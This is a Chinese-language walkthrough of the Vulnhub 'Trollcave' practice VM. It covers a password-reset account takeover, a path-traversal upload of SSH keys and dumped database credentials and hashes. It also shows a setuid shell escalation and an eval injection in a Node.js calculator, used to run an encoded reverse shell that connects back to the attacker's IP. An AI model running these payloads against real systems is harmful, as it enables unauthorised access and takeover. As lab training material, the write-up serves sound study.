<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p><strong>Trollcave</strong>是一个易受攻击的虚拟机，具有<a href="https://www.vulnhub.com/" target="_blank" rel="noopener">Vulnhub</a>的传统和一般的<a href="https://en.wikipedia.org/wiki/Wargame_(hacking)" target="_blank" rel="noopener">信息</a><a href="https://www.vulnhub.com/" target="_blank" rel="noopener">安全兵棋推演</a>。你从一个你一无所知的虚拟机开始——没有用户名，没有密码，只有你可以在网络上看到的。在这种情况下，您将看到一个包含大量用户的简单社区博客网站。从这个初始点开始，您枚举机器正在运行的服务和一般特征，并设计出通过查找和利用漏洞和错误配置来完全控制它的方法。</p>
<p>你的第一个目标是滥用机器上的服务来获得未经授权的 shell 访问。您的最终目标是读取<code>root</code>用户主目录中的文本文件<code>root/flag.txt</code>）。</p>
<p>此 VM 设计为整体且相当实用。我想模拟对真实网站的真实攻击，而不仅仅是呈现一个由不同元素组成的拼图框，并且我想避免更深奥的易受攻击的 VMisms，例如当您必须对发现端口的 MP3 进行信号处理时- 敲门顺序。当然，在现实和最有趣/具有挑战性的事物之间总是要权衡利弊，但我试图让挑战保持扎根。</p>
<p>因为这是您要下载、导入和启动的 VM，所以实现此目标的一种方法是挂载 VM 的硬盘。我没有加密磁盘或采取任何措施来防止这种情况发生，所以如果你想走那条路，继续吧。我也不会为完成这个 VM 提供奖品或任何东西，所以要知道这完全没有意义。</p>
<p>因为这是一个运行具有真实服务的真实操作系统的虚拟机，所以可能有一些方法可以达到<code>root</code>我不想要的。理想情况下，这应该是乐趣的一部分，但如果它们使盒子变得微不足道，我想了解并修复它们 - 在合理范围内。在此版本中，我已经安装了适用于 Ubuntu Server 16.04 LTS 的所有更新，但我不能也不会尝试针对未来出现的每个新 Linux 内核漏洞修补此 VM。所以有一个提示——你不必使用内核漏洞来根这个框。</p>
<p>你需要一个好的 HTTP 拦截代理——我推荐<a href="https://portswigger.net/burp" target="_blank" rel="noopener">Burpsuite——</a>以及一些网络工具，比如<code>nmap</code>和<code>nc</code>。您还需要一些虚拟化软件<a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="noopener">——VirtualBox</a>对大多数人来说是最简单的，但 KVM 和 VMWare 也应该能够<code>.ova</code>在稍微摆弄之后导入文件。导入 VM 后，将其与攻击系统放在同一网络上（<a href="https://digi.ninja/blog/untrusted_vms.php" target="_blank" rel="noopener">最好不要让其访问 Internet</a>）并开始黑客攻击！</p>
<p>您可以在<code>.ova</code>此处获取文件 ( <a href="https://drive.google.com/open?id=1DhbVvT-r3yKWXXjcH70oj5yEZ88TDsky" target="_blank" rel="noopener">929MB</a> )（<a href="https://drive.google.com/open?id=1DhbVvT-r3yKWXXjcH70oj5yEZ88TDsky" target="_blank" rel="noopener">2018 年 3 月 19 日</a>更新）。让我知道<a href="mailto:d@vidyat.es?subject=Trollcave">你的想法</a>。</p>
<p>不适用于 VMware。更新日志 v1.1 - 19/03/2018 v1.2 - 21/03/2018</p>
<p>靶机的地址：<a href="https://www.vulnhub.com/entry/trollcave-12,230/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/trollcave-12,230/</a></p>
</blockquote>
<h1 id="Trollcave开始"><a href="#Trollcave开始" class="headerlink" title="Trollcave开始"></a>Trollcave开始</h1><p>1、可以用两种方法确认靶场的存在，扫ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.1.0&#x2F;24</span><br><span class="line">nmap -sn 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure></div>

<p>2、扫目标端口开发情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -A 192.168.1.108</span><br></pre></td></tr></table></figure></div>

<p>3、访问主页，根据提示说有一个password_resets，我们扫一下目录情况</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.104&#x2F;password_resets -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-small.txt -t 200</span><br><span class="line"></span><br><span class="line">dirb http:&#x2F;&#x2F;192.168.1.104&#x2F;password_resets</span><br><span class="line"></span><br><span class="line">接着扫出任意重置密码了目录了</span><br><span class="line">http:&#x2F;&#x2F;192.168.1.104&#x2F;password_resets&#x2F;new</span><br></pre></td></tr></table></figure></div>

<p>4、通过改get参数，来改king的密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.104&#x2F;password_resets&#x2F;edit.aSp4X7kLnpkxOH4xu4Nyug?name&#x3D;King</span><br></pre></td></tr></table></figure></div>

<p>5、登陆上去之后有个文件上传，我们打开一下enable，然后再上传，因为是ruby语言写的，所以木马没用，我们只能靠提示的tails，猜测有tails用户，然后通过nmap确定有rsa加密登陆，所以用文件上传来覆盖/home/rails/.ssh/authorized_keys，最后登陆，下面展示命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -f rails  #伪造sha256</span><br><span class="line">mv rails.pub authorized_keys #重命名</span><br><span class="line">通过目录穿越，将其上传到..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;rails&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">mv rails id_rsa-rails #重命名</span><br><span class="line">ssh -i id_rsa-rails rails@192.168.1.104 #无密码连接</span><br></pre></td></tr></table></figure></div>

<h2 id="6、提权的方法，这个靶机中"><a href="#6、提权的方法，这个靶机中" class="headerlink" title="6、提权的方法，这个靶机中"></a>6、提权的方法，这个靶机中</h2><p>1、首先，信息收集，在网站目录发现config中数据库的信息</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">production:</span><br><span class="line">  adapter: postgresql</span><br><span class="line">  encoding: unicode</span><br><span class="line">  database: trollcave</span><br><span class="line">  pool: 5</span><br><span class="line">  host: localhost</span><br><span class="line">  username: tc</span><br><span class="line">  password: sowvillagedinnermoment</span><br></pre></td></tr></table></figure></div>

<p>2、<strong>接着尝试用sqlite3读取数据库文件</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">sqlite&gt; select * from private_messages</span><br><span class="line">   ...&gt; ;</span><br><span class="line">1|password|</span><br><span class="line">use it sparingly</span><br><span class="line"></span><br><span class="line">uFrrK3dXzWeZQ7JtGgZk4FT</span><br><span class="line"></span><br><span class="line">do NOT share it</span><br><span class="line">|1|3|2017-09-29 14:03:24.494241|2017-09-29 14:03:24.494241</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">admin_settings     comments           reports            user_files                                                                                                              </span><br><span class="line">blogs              private_messages   schema_migrations  users                                                                                                                   </span><br><span class="line">sqlite&gt; select * from users;                                                                                                                                                     </span><br><span class="line">1|King|king@trollcave.com|:)|$2a$10$tHX6EGkwuapTRY1&#x2F;7R&#x2F;meuVPLUT8Tkooh0M6WpQpGKOSSwuuc.7C.||5|0|||2017-09-29 14:03:23.339227|2017-09-29 14:03:23.339227|||                        </span><br><span class="line">2|dave|david@32letters.com|nah lol|$2a$10$DpHp4ikbNnq&#x2F;43uhbjWJcee9lTLDTTx2ndtSl99m81wDSvNBuztiS||4|0|||2017-09-29 14:03:23.414352|2017-09-29 14:03:23.414352|||                  </span><br><span class="line">3|dragon|dragon@trollcave.com|Over fire and over stone &#x2F; Over water and over bone &#x2F; Shining out like jewels of light &#x2F; On a sheet of purest night|$2a$10$XmozUYK&#x2F;xikEb7CktLCer.LXwXYFDzISlCNGKGh8sxyqy7OunCdFS||4|0|||2017-09-29 14:03:23.484532|2017-09-29 14:03:23.484532|||                                                                                    </span><br><span class="line">4|coderguy|coderguy@trollcave.com|;)|$2a$10$XVAiu4&#x2F;71LV.2JA5e6UZr.BEIvSpAI0Wt8YqKU0FOdcKwcQIAppLO||4|0|||2017-09-29 14:03:23.550390|2017-09-29 14:03:23.550390|||                </span><br><span class="line">5|cooldude89|kewldewdeightynine@zmail.com|i am the dankest|$2a$10$HR0yIsnfKaSG07Kge5Z7K.Ki7dthW3IqQ0PYd&#x2F;ZS3rA.KFjWv92z.||3|0|||2017-09-29 14:03:23.616162|2017-09-29 14:03:23.616162|||                                                                                                                                                                           </span><br><span class="line">6|Sir|sir@zmail.com|It&#39;s super secure|$2a$10$tYaFo0fGxFreOdFBy3ch5ej&#x2F;UrznlUQBcM8l7il0Zx25ca6as&#x2F;xza||3|0|||2017-09-29 14:03:23.682157|2017-09-29 14:03:23.682157|||               </span><br><span class="line">7|Q|q@zmail.com|Your normal password|$2a$10$gTZ1kX5xHLp0JT78n.UMeeAd789&#x2F;5h1p8Ox4L2e4rCIVPImb6vOfu||3|0|||2017-09-29 14:03:23.753882|2017-09-29 14:03:23.753882|||                </span><br><span class="line">8|teflon|tf@zmail.com|swordfish|$2a$10$F5Ajt2HI.7xshVrHJqZy6.Iv2myLqDJwgyzBDogDe79WlDdIrsBDO||3|0|||2017-09-29 14:03:23.819291|2017-09-29 14:03:23.819291|||                     </span><br><span class="line">9|TheDankMan|dope@dankmail.com|420|$2a$10$bbI2A71mL5pcCtY&#x2F;mB4nIeQzxi4z6&#x2F;c&#x2F;K&#x2F;0RpurZMMfBn4I7JGGlm||2|0|||2017-09-29 14:03:23.884605|2017-09-29 14:03:23.884605|||                  </span><br><span class="line">10|artemus|artemus_12145@zmail.com|garden|$2a$10$x&#x2F;L0IWKs29nrN9qOVisPzeIJIrBaZfCMXWJdco6DUtZlGMOAuWrmO||2|0|||2017-09-29 14:03:23.950848|2017-09-29 14:03:23.950848|||</span><br><span class="line">11|MrPotatoHead|potatoe@zmail.com|you know...|$2a$10$AmuZ8ccJ4r3kaAc13ycjTezsAbvtF66lNkq2R7tXmLNWuf8U12sLG||2|0|||2017-09-29 14:03:24.016908|2017-09-29 14:03:24.016908|||</span><br><span class="line">12|Ian|iane@zmail.com|a|$2a$10$InZ5.qJvFkgZX76xw8ZqGekxhwmvGCaRNBqU0rroOqG4RRuSZsXFK||2|0|||2017-09-29 14:03:24.082082|2017-09-29 14:03:24.082082|||</span><br><span class="line">13|kev|kevin@zmail.com|mother&#39;s maiden name|$2a$10$D13SoP5GCHC6RkIBOQSXKuQf9E9h5Mo1evGZJa9p23xzUSkfugj7S||1|0|||2017-09-29 14:03:24.149092|2017-09-29 14:03:24.149092|||</span><br><span class="line">14|notanother|notanother@zmail.com|(:|$2a$10$PYqCCOIop.NRMWm13ue26eEkc&#x2F;ZR&#x2F;7rDCOpiN5.9rkZ7&#x2F;GSUcJ8rC||1|0|||2017-09-29 14:03:24.215992|2017-09-29 14:03:24.215992|||</span><br><span class="line">15|anybodyhome|anybodyhome@zmail.com|no one is|$2a$10$Dc1Q8NufJ&#x2F;oEZLeIxFWASOT4Kj4&#x2F;WHzmTNUaD6U9omBtKapLJFKse||1|0|||2017-09-29 14:03:24.282237|2017-09-29 14:03:24.282237|||</span><br><span class="line">16|onlyme|onlymememe@zmail.com|It is what it is|$2a$10$X4DKSco.clov.ro0pcN.nO1DYa3V&#x2F;PRAQq6oOQCb&#x2F;TW.MJyaHqSnW||1|0|||2017-09-29 14:03:24.348750|2017-09-29 14:03:24.348750|||</span><br><span class="line">17|xer|xer@zmail.com|fave pronoun|$2a$10$rjjHGOYhobwzMPysTjd0k.OWH4x&#x2F;FlnCtIv6VjPstLR3RWYOSHyQ6||1|0|||2017-09-29 14:03:24.414057|2017-09-29 14:03:24.414057|||</span><br></pre></td></tr></table></figure></div>

<p>接着尝试连接5432的ptl数据库，因为kali无法访问，所以需要将端口转发出来</p>
<p>快键键 shift+波浪号（~）+C</p>
<p>3、就可以进入ssh模式，来进行端口转发，输入命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">ssh&gt; -L 5432:localhost:5432</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925222928014.png" alt="image-20210925222928014"></p>
</blockquote>
<p>本地可以查看，是否成功</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925223031477.png" alt="image-20210925223031477"></p>
<p>4、利用dbeaver这个软件来进行连接postgreSQL，密码就是我们刚刚收集的，并没有发现有用信息</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210925223212387.png" alt="image-20210925223212387"></p>
</blockquote>
<p>5、用同样的方法，将8888端口转到本地访问一下，发现有一个calc的关键字，搜索一下calc看看</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926044716522.png" alt="image-20210926044716522"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -iname calc 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure></div>

<p>接着发现King目录下有一个calc.js脚本，发现其可以被命令执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">var http &#x3D; require(&quot;http&quot;);</span><br><span class="line">var url &#x3D; require(&quot;url&quot;);</span><br><span class="line">var sys &#x3D; require(&#39;sys&#39;);</span><br><span class="line">var exec &#x3D; require(&#39;child_process&#39;).exec;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Start server</span><br><span class="line">function start(route)</span><br><span class="line">&#123;</span><br><span class="line">	function onRequest(request, response)</span><br><span class="line">	&#123;</span><br><span class="line">		var theurl &#x3D; url.parse(request.url);</span><br><span class="line">		var pathname &#x3D; theurl.pathname;</span><br><span class="line">		var query &#x3D; theurl.query; </span><br><span class="line">		console.log(&quot;Request for &quot; + pathname + query + &quot; received.&quot;);</span><br><span class="line">		route(pathname, request, query, response);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">http.createServer(onRequest).listen(8888, &#39;127.0.0.1&#39;);</span><br><span class="line">console.log(&quot;Server started&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Route request</span><br><span class="line">function route(pathname, request, query, response)</span><br><span class="line">&#123;</span><br><span class="line">	console.log(&quot;About to route request for &quot; + pathname);</span><br><span class="line">	switch (pathname)</span><br><span class="line">	&#123;</span><br><span class="line">		&#x2F;&#x2F; security risk</span><br><span class="line">		&#x2F;*case &quot;&#x2F;ping&quot;:</span><br><span class="line">			pingit(pathname, request, query, response);</span><br><span class="line">			break;	*&#x2F;</span><br><span class="line"></span><br><span class="line">		case &quot;&#x2F;&quot;:</span><br><span class="line">			home(pathname, request, query, response);</span><br><span class="line">			break;	</span><br><span class="line"></span><br><span class="line">		case &quot;&#x2F;calc&quot;:</span><br><span class="line">			calc(pathname, request, query, response);</span><br><span class="line">			break;	</span><br><span class="line"></span><br><span class="line">		default:</span><br><span class="line">			console.log(&quot;404&quot;);</span><br><span class="line">			display_404(pathname, request, response);</span><br><span class="line">			break;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function home(pathname, request, query, response)</span><br><span class="line">&#123;</span><br><span class="line">	response.end(&quot;&lt;h1&gt;The King&#39;s Calculator&lt;&#x2F;h1&gt;&quot; +</span><br><span class="line">			&quot;&lt;p&gt;Enter your calculation below:&lt;&#x2F;p&gt;&quot; +</span><br><span class="line">			&quot;&lt;form action&#x3D;&#39;&#x2F;calc&#39; method&#x3D;&#39;get&#39;&gt;&quot; +</span><br><span class="line">				&quot;&lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;sum&#39; value&#x3D;&#39;1+1&#39;&gt;&quot; +</span><br><span class="line">				&quot;&lt;input type&#x3D;&#39;submit&#39; value&#x3D;&#39;Calculate!&#39;&gt;&quot; +</span><br><span class="line">			&quot;&lt;&#x2F;form&gt;&quot; +</span><br><span class="line">			&quot;&lt;hr style&#x3D;&#39;margin-top:50%&#39;&gt;&quot; +</span><br><span class="line">			&quot;&lt;small&gt;&lt;i&gt;Powered by node.js&lt;&#x2F;i&gt;&lt;&#x2F;small&gt;&quot;</span><br><span class="line">			);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function calc(pathname, request, query, response)</span><br><span class="line">&#123;</span><br><span class="line">	sum &#x3D; query.split(&#39;&#x3D;&#39;)[1];</span><br><span class="line">	console.log(sum)</span><br><span class="line">	response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text&#x2F;plain&quot;&#125;);</span><br><span class="line"></span><br><span class="line">	response.end(eval(sum).toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function ping(pathname, request, query, response)</span><br><span class="line">&#123;</span><br><span class="line">	ip &#x3D; query.split(&#39;&#x3D;&#39;)[1];</span><br><span class="line">	console.log(ip)</span><br><span class="line">	response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text&#x2F;plain&quot;&#125;);</span><br><span class="line"></span><br><span class="line">	exec(&quot;ping -c4 &quot; + ip, function(err, stdout, stderr) &#123;</span><br><span class="line">		response.end(stdout);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function display_404(pathname, request, response)</span><br><span class="line">&#123;</span><br><span class="line">	response.write(&quot;&lt;h1&gt;404 Not Found&lt;&#x2F;h1&gt;&quot;);</span><br><span class="line">	response.end(&quot;I don&#39;t have that page, sorry!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Start the server and route the requests</span><br><span class="line">start(route);</span><br></pre></td></tr></table></figure></div>

<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>①在tmp目录中创建一个exp.c文件，写入获取king的shell的命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">	setreuid(1000,1000);	</span><br><span class="line">	execve(&quot;&#x2F;bin&#x2F;bash&quot;,NULL,NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>gcc编译为exp</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">gcc exp.c -o exp</span><br></pre></td></tr></table></figure></div>

<p>②在tmp目录中创建一个1.sh的执行文件，内容为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">cp &#x2F;tmp&#x2F;exp &#x2F;tmp&#x2F;exp-test</span><br><span class="line">chmod 4777 &#x2F;tmp&#x2F;exp-test</span><br></pre></td></tr></table></figure></div>

<p>利用burp抓包，在8888端口的calc中的sum直接执行命令，来执行1.sh使用king的权限</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926053459005.png" alt="image-20210926053459005"></p>
</blockquote>
<p>接着就获得了一个king的权限，并且任意用户都能使用的exp</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926053537551.png" alt="image-20210926053537551"></p>
</blockquote>
<p>③root的权限</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210926053634293.png" alt="image-20210926053634293"></p>
</blockquote>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>①利用网上找到的一个payload生成命令执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: %s "</span> % (sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">IP_ADDR = sys.argv[<span class="number">1</span>]</span><br><span class="line">PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charencode</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="string">"""String.CharCode"""</span></span><br><span class="line">    encoded = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encoded = encoded + <span class="string">","</span> + str(ord(char))</span><br><span class="line">    <span class="keyword">return</span> encoded[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] LHOST = %s"</span> % (IP_ADDR)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] LPORT = %s"</span> % (PORT)</span><br><span class="line">NODEJS_REV_SHELL = <span class="string">'''(function()&#123; var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("net"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat()&#123; client.socket = net.connect(%s, "%s", function() &#123; client.socket.pipe(sh.stdin); if (typeof util.pump === "undefined") &#123; sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); &#125; else &#123; util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); &#125; &#125;); socket.on("error", function(error) &#123; counter++; if(counter&lt;= 10)&#123; setTimeout(function() &#123; StagerRepeat();&#125;, 5*1000); &#125; else process.exit(); &#125;); &#125; StagerRepeat(); &#125;)();1+1;'''</span> % (PORT, IP_ADDR)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Encoding"</span></span><br><span class="line">PAYLOAD = charencode(NODEJS_REV_SHELL)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"eval(String.fromCharCode(%s))"</span> % (PAYLOAD)</span><br></pre></td></tr></table></figure></div>

<p>②、接着利用这个脚本生成命令shell</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210922160137541.png" alt="image-20210922160137541"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~&#x2F;BC&#x2F;trollcave]</span><br><span class="line">└─# python exp.py 192.168.1.102 1234                                                                          </span><br><span class="line">[+] LHOST &#x3D; 192.168.1.102</span><br><span class="line">[+] LPORT &#x3D; 1234</span><br><span class="line">[+] Encoding</span><br><span class="line">eval(String.fromCharCode(40,102,117,110,99,116,105,111,110,40,41,123,32,118,97,114,32,114,101,113,117,105,114,101,32,61,32,103,108,111,98,97,108,46,114,101,113,117,105,114,101,32,124,124,32,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,99,111,110,115,116,114,117,99,116,111,114,46,95,108,111,97,100,59,32,105,102,32,40,33,114,101,113,117,105,114,101,41,32,114,101,116,117,114,110,59,32,118,97,114,32,99,109,100,32,61,32,40,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,112,108,97,116,102,111,114,109,46,109,97,116,99,104,40,47,94,119,105,110,47,105,41,41,32,63,32,34,99,109,100,34,32,58,32,34,47,98,105,110,47,115,104,34,59,32,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,34,110,101,116,34,41,44,32,99,112,32,61,32,114,101,113,117,105,114,101,40,34,99,104,105,108,100,95,112,114,111,99,101,115,115,34,41,44,32,117,116,105,108,32,61,32,114,101,113,117,105,114,101,40,34,117,116,105,108,34,41,44,32,115,104,32,61,32,99,112,46,115,112,97,119,110,40,99,109,100,44,32,91,93,41,59,32,118,97,114,32,99,108,105,101,110,116,32,61,32,116,104,105,115,59,32,118,97,114,32,99,111,117,110,116,101,114,61,48,59,32,102,117,110,99,116,105,111,110,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,123,32,99,108,105,101,110,116,46,115,111,99,107,101,116,32,61,32,110,101,116,46,99,111,110,110,101,99,116,40,49,50,51,52,44,32,34,49,57,50,46,49,54,56,46,49,46,49,48,50,34,44,32,102,117,110,99,116,105,111,110,40,41,32,123,32,99,108,105,101,110,116,46,115,111,99,107,101,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,32,105,102,32,40,116,121,112,101,111,102,32,117,116,105,108,46,112,117,109,112,32,61,61,61,32,34,117,110,100,101,102,105,110,101,100,34,41,32,123,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,101,108,115,101,32,123,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,111,117,116,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,117,116,105,108,46,112,117,109,112,40,115,104,46,115,116,100,101,114,114,44,32,99,108,105,101,110,116,46,115,111,99,107,101,116,41,59,32,125,32,125,41,59,32,115,111,99,107,101,116,46,111,110,40,34,101,114,114,111,114,34,44,32,102,117,110,99,116,105,111,110,40,101,114,114,111,114,41,32,123,32,99,111,117,110,116,101,114,43,43,59,32,105,102,40,99,111,117,110,116,101,114,60,61,32,49,48,41,123,32,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,32,123,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,125,44,32,53,42,49,48,48,48,41,59,32,125,32,101,108,115,101,32,112,114,111,99,101,115,115,46,101,120,105,116,40,41,59,32,125,41,59,32,125,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,59,32,125,41,40,41,59,49,43,49,59))</span><br></pre></td></tr></table></figure></div>

<p>③、接着在ssh刚连接的用户中执行下面命令，并且同时本机监听1234端口用nc</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210922160228344.png" alt="image-20210922160228344"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">curl &#39;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;calc?sum&#x3D;eval(String.fromCharCode(40,102,117,110,99,116,105,111,110,40,41,123,32,118,97,114,32,114,101,113,117,105,114,101,32,61,32,103,108,111,98,97,108,46,114,101,113,117,105,114,101,32,124,124,32,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,99,111,110,115,116,114,117,99,116,111,114,46,95,108,111,97,100,59,32,105,102,32,40,33,114,101,113,117,105,114,101,41,32,114,101,116,117,114,110,59,32,118,97,114,32,99,109,100,32,61,32,40,103,108,111,98,97,108,46,112,114,111,99,101,115,115,46,112,108,97,116,102,111,114,109,46,109,97,116,99,104,40,47,94,119,105,110,47,105,41,41,32,63,32,34,99,109,100,34,32,58,32,34,47,98,105,110,47,115,104,34,59,32,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,34,110,101,116,34,41,44,32,99,112,32,61,32,114,101,113,117,105,114,101,40,34,99,104,105,108,100,95,112,114,111,99,101,115,115,34,41,44,32,117,116,105,108,32,61,32,114,101,113,117,105,114,101,40,34,117,116,105,108,34,41,44,32,115,104,32,61,32,99,112,46,115,112,97,119,110,40,99,109,100,44,32,91,93,41,59,32,118,97,114,32,99,108,105,101,110,116,32,61,32,116,104,105,115,59,32,118,97,114,32,99,111,117,110,116,101,114,61,48,59,32,102,117,110,99,116,105,111,110,32,83,116,97,103,101,114,82,101,112,101,97,116,40,41,123,32,99,108,105,101,110,116,46,115,111,99,107,101,116,32,61,32,110,101,116,46,99,111,110,110,101,99,116,40,49,50,51,52,44,32,34,49,57,50,46,49,54,56,46,49,51,54,46,49,51,52,34,44,32,102,117,110,99,116,105,111,110,40,41,32,123,32,99,108,105,101,